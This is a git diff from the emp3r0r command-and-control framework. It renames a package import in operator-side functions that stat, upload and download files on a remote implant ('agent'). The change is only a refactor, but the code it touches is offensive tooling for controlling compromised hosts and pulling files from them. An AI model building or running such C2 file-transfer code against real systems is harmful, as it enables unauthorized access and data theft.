@@ -12,15 +12,15 @@ import (
 	"time"
 
 	"github.com/google/uuid"
-	emp3r0r_data "github.com/jm33-m0/emp3r0r/core/lib/data"
+	emp3r0r_def "github.com/jm33-m0/emp3r0r/core/lib/emp3r0r_def"
 	"github.com/jm33-m0/emp3r0r/core/lib/tun"
 	"github.com/jm33-m0/emp3r0r/core/lib/util"
 )
 
 // StatFile Get stat info of a file on agent
-func StatFile(filepath string, a *emp3r0r_data.Emp3r0rAgent) (fi *util.FileStat, err error) {
+func StatFile(filepath string, a *emp3r0r_def.Emp3r0rAgent) (fi *util.FileStat, err error) {
 	cmd_id := uuid.NewString()
-	cmd := fmt.Sprintf("%s --path '%s'", emp3r0r_data.C2CmdStat, filepath)
+	cmd := fmt.Sprintf("%s --path '%s'", emp3r0r_def.C2CmdStat, filepath)
 	err = SendCmd(cmd, cmd_id, a)
 	if err != nil {
 		return
@@ -50,7 +50,7 @@ func StatFile(filepath string, a *emp3r0r_data.Emp3r0rAgent) (fi *util.FileStat,
 }
 
 // PutFile put file to agent
-func PutFile(lpath, rpath string, a *emp3r0r_data.Emp3r0rAgent) error {
+func PutFile(lpath, rpath string, a *emp3r0r_def.Emp3r0rAgent) error {
 	// file sha256sum
 	CliPrintInfo("Calculating sha256sum of '%s'", lpath)
 	sum := tun.SHA256SumFile(lpath)
@@ -95,7 +95,7 @@ func generateGetFilePaths(file_path string) (write_dir, save_to_file, tempname, 
 }
 
 // GetFile get file from agent
-func GetFile(file_path string, agent *emp3r0r_data.Emp3r0rAgent) (ftpSh *StreamHandler, err error) {
+func GetFile(file_path string, agent *emp3r0r_def.Emp3r0rAgent) (ftpSh *StreamHandler, err error) {
 	if !util.IsExist(FileGetDir) {
 		err = os.MkdirAll(FileGetDir, 0o700)
 		if err != nil {
@@ -168,7 +168,7 @@ func GetFile(file_path string, agent *emp3r0r_data.Emp3r0rAgent) (ftpSh *StreamH
 	FTPMutex.Unlock()
 
 	// h2x
-	ftpSh.H2x = new(emp3r0r_data.H2Conn)
+	ftpSh.H2x = new(emp3r0r_def.H2Conn)
 
 	// cmd
 	cmd := fmt.Sprintf("get --file_path '%s' --offset %d --token '%s'", file_path, offset, ftpSh.Token)
